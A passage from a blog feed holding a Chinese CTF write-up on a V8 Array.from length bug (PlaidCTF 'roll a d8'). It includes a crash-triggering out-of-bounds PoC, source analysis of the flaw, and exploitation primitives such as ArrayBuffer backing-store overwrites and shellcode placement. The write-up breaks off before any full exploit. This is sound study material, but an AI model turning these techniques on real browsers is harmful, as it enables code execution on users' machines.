title="文件系统设计层次"></a>文件系统设计层次</h5><ul><li>用户方法层：在应用程序和文件系统以及保存数据的设备之间提供了一个标准接口</li><li>逻辑I/O：是用户和应用程序能够访问到记录</li><li>基本I/O管理程序：负责所有文件的I/O初始化和终止，维护设备输入输出、调度和文件状态</li><li>基本文件系统/物理IO层：与计算机系统外部环境的基本接口。处理在磁盘间或磁带系统间交换的数据块</li><li>设备驱动程序：直接与外围设备通信，负责启动该设备上的I/O操作，处理I/O请求。</li></ul><h5 id="fat"><a href="#fat" class="headerlink" title="fat"></a>fat</h5><h5 id="相对路径、绝对路径"><a href="#相对路径、绝对路径" class="headerlink" title="相对路径、绝对路径"></a>相对路径、绝对路径</h5><!-- rebuild by neat -->]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>v8 exploit入门[PlaidCTF roll a d8]</title>
      <link href="/post/abaa2e35.html"/>
      <url>/post/abaa2e35.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><blockquote><p>本文首发于先知社区 <a href="https://xz.aliyun.com/t/5190" target="_blank" rel="noopener">https://xz.aliyun.com/t/5190</a></p></blockquote><blockquote><p>这篇博客3月份一直拖到现在才写完2333，太水了<br>一直想要入门chrome漏洞挖掘，于是就打算从一道<a href="https://ctftime.org/task/6081" target="_blank" rel="noopener">CTF题目</a>入手（其实也是一个真实的漏洞），这篇文章记录了我的学习过程，是一个总结，也希望能帮到同样在入门的朋友。</p></blockquote><a id="more"></a><h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul><li>Ubuntu16.04 x64</li><li><a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">pwndbg</a></li></ul><h2 id="v8调试环境搭建"><a href="#v8调试环境搭建" class="headerlink" title="v8调试环境搭建"></a>v8调试环境搭建</h2><ul><li>这里主要参考了sakura师傅的教程<ul><li><a href="http://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/05/06/v8/</a></li></ul></li><li>以及最重要的一点，挂代理，这里我使用的是<code>polipo</code><ul><li><a href="http://couplee.wang/wnagzihxa1n/BrowserSecurity/Ubuntu_16.04_x64%E7%BC%96%E8%AF%91V8%E6%BA%90%E7%A0%81/article.html" target="_blank" rel="noopener">http://couplee.wang/wnagzihxa1n/BrowserSecurity/Ubuntu_16.04_x64%E7%BC%96%E8%AF%91V8%E6%BA%90%E7%A0%81/article.html</a></li></ul></li></ul><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>首先进入题目所给出的<a href="https://crbug.com/821137" target="_blank" rel="noopener">链接</a>，找到修复bug的commit。<br><img src="/post/abaa2e35/bugs.png" alt="bugs.png"><br>然后可以找到包含漏洞的版本hash值和一个poc文件<br><img src="/post/abaa2e35/git.png" alt="git.png"><br>然后通过parent的hash值回退到漏洞版本，并进行编译（debug模式）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure><p>relase模式编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tools/dev/v8gen.py x64.relase</span><br><span class="line">ninja -C out.gn/x64.relase d8</span><br></pre></td></tr></table></figure><h1 id="分析与调试技巧"><a href="#分析与调试技巧" class="headerlink" title="分析与调试技巧"></a>分析与调试技巧</h1><blockquote><p>这里先简单介绍一下我学习过程中用到的调试方法。</p></blockquote><ol><li><p>%DebugPrint()<br>这是一个极其常用的函数，可以通过该函数打印出对象的详细信息，如内存地址、属性、map等。运行时使用参数<code>--allow-natives-syntax</code><br>如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line">%DebugPrint(arr);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 --allow-natives-syntax ./test.js</span><br></pre></td></tr></table></figure></li><li><p>DebugBreak()<br>当分析v8源码时，遇到<code>CodeStubAssembler</code>编写的代码，可以在其中插入<code>DebugBreak();</code>，这相当于插入了一个断点(类似<code>int 3</code>)，重新编译后使用调试器调试时，可以在插入处断下。</p></li><li><p>Print()<br>同样，遇到<code>CodeStubAssembler</code>编写的代码时，可以使用它来输出一些变量值，函数原型是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CodeStubAssembler::Print(<span class="keyword">const</span> <span class="keyword">char</span>* prefix, Node* tagged_value)</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二个参数是Node*型，可能需要强转</span></span><br><span class="line">Print(<span class="string">"array"</span>, <span class="keyword">static_cast</span>&lt;Node*&gt;(<span class="built_in">array</span>.value()));</span><br></pre></td></tr></table></figure><p>重新编译后即可。</p></li><li><p>readline()<br>可以添加在js代码中，让程序停下来等待输入，方便使用gdb断下进行调试。该方法比写一个while死循环好在，让程序停下后，还可以让程序继续运行下去。</p></li><li><p>V8自带gdb调试命令<br>在/tools/目录下，可以找到gdbinit和gdb-v8-support.py。我将gdb-v8-support.py复制到了根目录下，然后修改自己的.gdbinit文件，将提供的gdbinit都复制过来。<br><img src="/post/abaa2e35/v8tools.png" alt="v8tools.png"><br>就可以在gdb中使用v8自带调试命令了<br>具体命令可以在gdbinit中自己查阅，注释还是很友好的。我最常用的就是job。</p></li><li><p><a href="https://github.com/inexorabletash/polyfill" target="_blank" rel="noopener">polyfill</a><br>因为我没有系统学过js开发，不是太清楚ployfill在实际开发时的作用（似乎是用来补充一些浏览器缺少的api）。但是在学习v8的过程中对我有极大的帮助，在<code>ployfill</code>中使用js自身实现了许多js的原生函数，这意味着，在调试js原生函数的时候可以通过查看<code>polyfill</code>来了解函数实现细节。而且经过和v8中使用<code>CodeStubAssembler</code>实现的原生函数，可以发现实现逻辑基本一致。</p></li></ol><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">oobArray[oobArray.length - <span class="number">1</span>] = <span class="number">0x41414141</span>;</span><br></pre></td></tr></table></figure><p>运行该poc，触发crash（注意使用debug编译的d8）<br><img src="/post/abaa2e35/crash.png" alt="crash.png"><br>简单的分析该<code>poc</code><br>首先创建了一个数组oobArray<br>然后将<code>function() { return oobArray }</code>作为<code>this</code>参数传入<code>Array.from.call</code>。</p><p>此处，我查阅了pollyfill中对<code>Array.from</code>的实现（这里对Array.from的分析其实是在下文分析漏洞时进行的，但为了描述的方便，先写在此处）<br><img src="/post/abaa2e35/polyfill1.png" alt="plooyfill1.png"><br>因为这里<code>Array.from.call</code>的this参数是一个函数，所以会调用<code>var a = new c()</code><br>查询javascript中<code>new关键字</code>的返回值可知，当使用new关键字调用一个函数时，若函数返回一个非原始变量（如像object、array或function），那么这些返回值将取代原本应该返回的this实例。<br>这意味着这里调用<code>c()</code>会返回<code>oobArray</code>，并且此后的操作都将直接修改<code>oobArray</code>。</p><p>回到<code>poc</code>中，在<code>iterator</code>中可以看到，在最后一次迭代时，将<code>oobArray</code>的长度修改为<code>0</code>。<br>最后的赋值语句触发crash</p><p>通过poc可以猜测，可能是最后一次迭代时对<code>oobArray.length</code>的赋值时出现了bug, 导致最后<code>oobArray</code>实际长度与<code>length的值</code>的不同，造成越界访问。<br>下面进行详细的分析。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先从<code>diff</code>入手，看看如何修复的该漏洞<br><img src="/post/abaa2e35/diff.png" alt="diff.png"><br>注意到这里只修改了<code>GenerateSetLength</code>函数中的一个跳转语句，将<code>LessThan</code>修改为<code>NotEqual</code>，这说明极有可能是在<code>length_smi &gt; old_length</code>时的处理出现了问题。但仍需进一步分析。</p><h3 id="CodeStubAssembler简介"><a href="#CodeStubAssembler简介" class="headerlink" title="CodeStubAssembler简介"></a>CodeStubAssembler简介</h3><p>这里分析将涉及到CodeStubAssembler代码，这里先简单介绍一下。</p><blockquote><p>v8为了提高效率，采用了CodeStubAssembler来编写js的原生函数，它是是一个定制的，与平台无关的汇编程序，它提供低级原语作为汇编的精简抽象，但也提供了一个扩展的高级功能库。</p></blockquote><p>这里我简单记录其中几个的语法，一些是我自己推测理解的，仅供参考。。</p><ul><li>TF_BUILTIN：创建一个函数</li><li>Label：用于定义将要用到的标签名，这些标签名将作为跳转的目标</li><li>BIND：用于绑定一个标签，作为跳转的目标</li><li>Branch：条件跳转指令</li><li>VARIABLE：定义一些变量</li><li>Goto：跳转</li></ul><h3 id="漏洞代码逻辑"><a href="#漏洞代码逻辑" class="headerlink" title="漏洞代码逻辑"></a>漏洞代码逻辑</h3><blockquote><p>建议使用IDE之类来查看代码，方便搜索和跳转。<br>首先查看<code>GenerateSetLength</code>函数</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GenerateSetLength</span><span class="params">(TNode&lt;Context&gt; context, TNode&lt;Object&gt; <span class="built_in">array</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                         TNode&lt;Number&gt; length)</span> </span>&#123;</span><br><span class="line">    Label fast(this), runtime(this), done(this);</span><br><span class="line">    <span class="comment">// Only set the length in this stub if</span></span><br><span class="line">    <span class="comment">// 1) the array has fast elements,</span></span><br><span class="line">    <span class="comment">// 2) the length is writable,</span></span><br><span class="line">    <span class="comment">// 3) the new length is greater than or equal to the old length.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) Check that the array has fast elements.</span></span><br><span class="line">    <span class="comment">// TODO(delphick): Consider changing this since it does an an unnecessary</span></span><br><span class="line">    <span class="comment">// check for SMIs.</span></span><br><span class="line">    <span class="comment">// TODO(delphick): Also we could hoist this to after the array construction</span></span><br><span class="line">    <span class="comment">// and copy the args into array in the same way as the Array constructor.</span></span><br><span class="line">    BranchIfFastJSArray(<span class="built_in">array</span>, context, &amp;fast, &amp;runtime);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;fast);</span><br><span class="line">    &#123;</span><br><span class="line">      TNode&lt;JSArray&gt; fast_array = CAST(<span class="built_in">array</span>);</span><br><span class="line">     </span><br><span class="line">      TNode&lt;Smi&gt; length_smi = CAST(length);</span><br><span class="line">    </span><br><span class="line">      TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);</span><br><span class="line">      CSA_ASSERT(<span class="keyword">this</span>, TaggedIsPositiveSmi(old_length));</span><br><span class="line"></span><br><span class="line">      EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 3) If the created array already has a length greater than required,</span></span><br><span class="line">      <span class="comment">//    then use the runtime to set the property as that will insert holes</span></span><br><span class="line">      <span class="comment">//    into the excess elements and/or shrink the backing store.</span></span><br><span class="line">      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line"></span><br><span class="line">      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                     length_smi);</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;runtime);</span><br><span class="line">    &#123;</span><br><span class="line">      CallRuntime(Runtime::kSetProperty, context, <span class="keyword">static_cast</span>&lt;Node*&gt;(<span class="built_in">array</span>),</span><br><span class="line">                  CodeStubAssembler::LengthStringConstant(), length,</span><br><span class="line">                  SmiConstant(LanguageMode::kStrict));</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;done);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先判断是否具有<a href="https://v8.dev/blog/fast-properties" target="_blank" rel="noopener">fast element</a>，这里poc代码执行时会进入<code>&amp;fast</code>分支</p><p>随后若<code>length_smi &lt; old_length</code>，就跳转到<code>&amp;runtime</code>，否则执行<code>StoreObjectFieldNoWriteBarrier</code></p><p>根据源码注释可以知道，<code>&amp;runtime</code>会进行内存的缩减<br>而分析<code>StoreObjectFieldNoWriteBarrier</code>函数，这应该是一个赋值函数，将<code>array</code>的<code>length属性值</code>修改为<code>length_smi</code></p><p>前面我们猜测是<code>length_smi &gt; old_length</code>时出现问题，通过这里的分析，漏洞根源似乎更明了了。<br>当<code>length_smi &gt; old_length</code>，程序不会执行<code>&amp;runtime</code>去进行缩减内存等操作，而是会直接修改length的值。那么可以猜测是将较大的<code>length_smi</code>写入了数组的<code>length</code>，导致数组的长度属性值大于了实际长度，造成了越界访问。</p><p>看到这里，感觉仍然没有完全分析透彻，不知道函数各个参数的具体来源都是什么，也不知道为什么<code>length_smi</code>会大于<code>old_length</code>。</p><p>于是尝试寻找调用该函数的上层函数，搜索后定位到了<code>TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)</code>，代码比较长，不过还是得慢慢看。<br>(之所以确定这个函数，是因为poc中确实正好调用了<code>Array.from</code>)<br><img src="/post/abaa2e35/search.png" alt="search.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES #sec-array.from</span></span><br><span class="line">TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  TNode&lt;JSReceiver&gt; array_like = ToObject(context, items);</span><br><span class="line"></span><br><span class="line">  TVARIABLE(Object, <span class="built_in">array</span>);</span><br><span class="line">  TVARIABLE(Number, length);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Determine whether items[Symbol.iterator] is defined:</span></span><br><span class="line">  IteratorBuiltinsAssembler iterator_assembler(state());</span><br><span class="line">  Node* iterator_method =</span><br><span class="line">      iterator_assembler.GetIteratorMethod(context, array_like);</span><br><span class="line">  Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果可以迭代</span></span><br><span class="line">  BIND(&amp;iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 返回一个数组，用于存储迭代后得到的结果</span></span><br><span class="line">    <span class="comment">// Construct the output array with empty length.</span></span><br><span class="line">    <span class="built_in">array</span> = ConstructArrayLike(context, args.GetReceiver());</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    Goto(&amp;loop);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开始迭代</span></span><br><span class="line">    BIND(&amp;loop);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 判断迭代是否结束</span></span><br><span class="line">      <span class="comment">// Loop while iterator is not done.</span></span><br><span class="line">      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(</span><br><span class="line">          context, iterator_record, &amp;loop_done, fast_iterator_result_map));</span><br><span class="line">      TVARIABLE(Object, value,</span><br><span class="line">                CAST(iterator_assembler.IteratorValue(</span><br><span class="line">                    context, next, fast_iterator_result_map)));</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">// 将得到的结果存入array</span></span><br><span class="line">      <span class="comment">// Store the result in the output object (catching any exceptions so the</span></span><br><span class="line">      <span class="comment">// iterator can be closed).</span></span><br><span class="line">      Node* define_status =</span><br><span class="line">          CallRuntime(Runtime::kCreateDataProperty, context, <span class="built_in">array</span>.value(),</span><br><span class="line">                      index.value(), value.value());</span><br><span class="line">      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 索引加1</span></span><br><span class="line">      index = NumberInc(index.value());</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//迭代结束</span></span><br><span class="line">    BIND(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//将迭代次数赋值给length变量</span></span><br><span class="line">      length = index;</span><br><span class="line">      Goto(&amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  BIND(&amp;finished);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用GenerateSetLength，将array和迭代次数作为参数</span></span><br><span class="line">  <span class="comment">// Finally set the length on the output and return it.</span></span><br><span class="line">  GenerateSetLength(context, <span class="built_in">array</span>.value(), length.value());</span><br><span class="line">  args.PopAndReturn(<span class="built_in">array</span>.value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配合源码注释，可以基本了解函数流程。当然，这里还可以参考<code>polyfill</code>中的实现。</p><p>在可以迭代的情况下，会使用<code>ConstructArrayLike</code>返回一个数组<code>array</code>，用于存储迭代输出的结果。配合前文分析的<code>polyfill</code>中的实现，这里返回的数组就是<code>oobArray</code>。<br>这里也可以通过输出调试信息来进行验证<br><img src="/post/abaa2e35/print.png" alt="print.png"><br><img src="/post/abaa2e35/print2.png" alt="print2.png"></p><p>然后会进入到<code>BIND(&amp;loop)</code>块，这应该就是在使用<code>Symbol.iterator</code>在进行迭代，每次迭代所得到的值都会存入<code>array</code></p><p>迭代结束后将进入<code>&amp;loop_done</code>，这里将<code>index</code>赋值给了<code>length</code>，也就是说<code>length</code>中存储的是<code>迭代次数</code>。</p><p>最后调用了我们已经分析过的<code>GenerateSetLength</code>，三个参数分别是<code>context</code>，用于存储结果的<code>array</code>，迭代次数<code>length</code></p><h2 id="漏洞原理总结"><a href="#漏洞原理总结" class="headerlink" title="漏洞原理总结"></a>漏洞原理总结</h2><p>结合前面<code>GenerateSetLength</code>的分析，我们就可以得出整个<code>array.from</code>的处理逻辑</p><p>当在<code>Array.from</code>中迭代完成后调用了<code>GenerateSetLength</code></p><p>在<code>GenerateSetLength</code>中，若迭代次数<strong>小于</strong><code>array</code>的长度，意味着<code>array</code>的长度大于了需求的长度，那么就需要对内存进行整理，释放多余的空间。</p><blockquote><p>这里我的想法是，迭代时是按顺序依次遍历每个元素，那么<code>array</code>的前<code>length_smi</code>个元素一定是被迭代访问过的且也是仅访问过的，后面多出的元素都不是迭代得到的，所以可以去掉。</p></blockquote><p>然而开发者似乎忽略了<strong>传入的数组可以是初始数组本身</strong>的情况，从而认为数组长度应该不会小于迭代次数（因为每次迭代都会创建一个新的数组元素）</p><p>所以若数组是初始数组，那么我们就可以在迭代途中修改数组的长度。将正在迭代的数组长度缩小，那么就会导致数组多余的空间被释放，但是在<code>GenerateSetLength</code>中，又将<code>array.length</code>直接改写为较大的<code>length_smi</code>（迭代次数），导致长度属性值大于实际长度，造成越界访问。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="V8内存模型"><a href="#V8内存模型" class="headerlink" title="V8内存模型"></a>V8内存模型</h2><h3 id="Tagged-Value"><a href="#Tagged-Value" class="headerlink" title="Tagged Value"></a>Tagged Value</h3><p>在v8中，存在两种类型，一个是Smi((small integer)，一个是指针类型。由于对齐，所以指针的最低位总是0，<code>Tagged Value</code>就是利用了最低位来区别Smi和指针类型。当最低位为1时，表示这是一个指针，当最低位为0，那么这就是一个Smi。</p><ul><li>Smi<br>为了节约内存、加快运算速度等，实现了一个小整数类型，被称作Smi。<br>在32位环境中，Smi占据32位，其中最低位为标记位（为0），所以Smi只使用了31位来表示值。<br>在64位环境中，Smi占据64位，其中最低位为标记位（为0），但是只有高32位用于表示值，低32位都为0（包括标记位）</li><li>指针<br>最低位为1，在访问时需要将最低位置回0</li></ul><h3 id="JsObject"><a href="#JsObject" class="headerlink" title="JsObject"></a>JsObject</h3><p>在V8中，JavaScript对象初始结构如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ hiddenClass / map] -&gt; ... ; 指向Map</span><br><span class="line">[ properties  ] -&gt; [empty array]</span><br><span class="line">[ elements    ] -&gt; [empty array]</span><br><span class="line">[ reserved #1 ] -\</span><br><span class="line">[ reserved #2]  |</span><br><span class="line">[ reserved #3 ]  &#125;- in object properties,即预分配的内存空间</span><br><span class="line">...............     |</span><br><span class="line">[ reserved #N ] -/</span><br></pre></td></tr></table></figure><ul><li>Map中存储了一个对象的元信息，包括对象上属性的个数，对象的大小以及指向构造函数和原型的指针等等。同时，Map中保存了Js对象的属性信息，也就是各个属性在对象中存储的偏移。然后属性的值将根据不同的类型，放在properties、element以及预留空间中。</li><li>properties指针，用于保存通过属性名作为索引的元素值，类似于字典类型</li><li>elements指针，用于保存通过整数值作为索引的元素值，类似于常规数组</li><li><p>reserved #n，为了提高访问速度，V8在对象中预分配了的一段内存区域，用来存放一些属性值（称为in-object属性），当向object中添加属性时，会先尝试将新属性放入这些预留的槽位。当in-onject槽位满后，V8才会尝试将新的属性放入properties中。</p><p><img src="/post/abaa2e35/object.png" alt="object.png"><br><img src="/post/abaa2e35/object2.png" alt="object2.png"></p></li></ul><p>当然，这里的介绍十分简略，详细细节可以参考文末给出的一些参考链接</p><h3 id="ArrayBuffer-amp-amp-TypedArray"><a href="#ArrayBuffer-amp-amp-TypedArray" class="headerlink" title="ArrayBuffer &amp;&amp; TypedArray"></a>ArrayBuffer &amp;&amp; TypedArray</h3><ul><li>ArrayBuffer<br>ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区。ArrayBuffer 不能直接操作，而是要通过“视图”进行操作。“视图”部署了数组接口，这意味着，可以用数组的方法操作内存。</li><li>TypedArray<br>用来生成内存的视图，通过9个构造函数，可以生成9种数据格式的视图，比如Uint8Array（无符号8位整数）数组视图, Int16Array（16位整数）数组视图, Float64Array（64位浮点数）数组视图等等。</li></ul><p>简单的说，ArrayBuffer就代表一段原始的二进制数据，而TypedArray代表了一个确定的数据类型，当TypedArray与ArrayBuffer关联，就可以通过特定的数据类型格式来访问内存空间。<br>这在我们的利用中十分重要，因为这意味着我们可以在一定程度上像C语言一样直接操作内存。</p><p><strong>内存结构</strong><br><img src="/post/abaa2e35/ArrayObject.png" alt="ArrayObject.png"><br>在ArrayBuffer中存在一个BackingStore指针，这个指针指向的就是ArrayBuffer开辟的内存空间，可以使用TypedArray指定的类型读取和写入该区域，并且，这片内存区域是位于系统堆中的而不是属于GC管理的区域。<br><img src="/post/abaa2e35/ArrayObject2.png" alt="ArrayObject2.png"><br>常见利用有：</p><ol><li>可以如果修改ArrayBuffer中的Length，那么就能够造成越界访问。</li><li>如果能够修改BackingStore指针，那么就可以获得任意读写的能力了，这是非常常用的一个手段</li><li>可以通过BackingStore指针泄露堆地址，还可以在堆中布置shellcode。</li></ol><h3 id="JsFunction"><a href="#JsFunction" class="headerlink" title="JsFunction"></a>JsFunction</h3><p>在V8利用中，function也常常成为利用的一个目标。其内存结构如下：<br><img src="/post/abaa2e35/function.png" alt="function.png"><br>其中，CodeEntry是一个指向JIT代码的指针（RWX区域），如果具有任意写能力，那么可以向JIT代码处写入自己的shellcode，实现任意代码执行。<br>但是，在v8 6.7版本之后，function的code不再可写，所以不能够直接修改jit代码了。<strong>本文漏洞将不采用修改jit代码的方法</strong>。<br>（注：内存布局图是根据sakura师傅的博客重画的，但是我调试后发现，貌似函数代码指针应该在<code>kLiteralsOffset</code>的位置）<br><img src="/post/abaa2e35/function2.png" alt="function2.png"></p><h2 id="自制类型转换小工具"><a href="#自制类型转换小工具" class="headerlink" title="自制类型转换小工具"></a>自制类型转换小工具</h2><p>在v8利用中，不可避免的会读写内存。而读写内存就会使用到前文提到的<code>ArrayBuffer &amp;&amp; TypedArray</code>。在64位程序中，因为没有<code>Uint64Array</code>，所以要读写8字节的内存单元只能使用<code>Float64Array</code>（或者两个<code>Uint32</code>），但是float类型存储为小数编码，所以为了方便读写，我们需要自己实现一个Uint64与Float64之间转换的小工具</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line"><span class="keyword">constructor</span>()&#123;</span><br><span 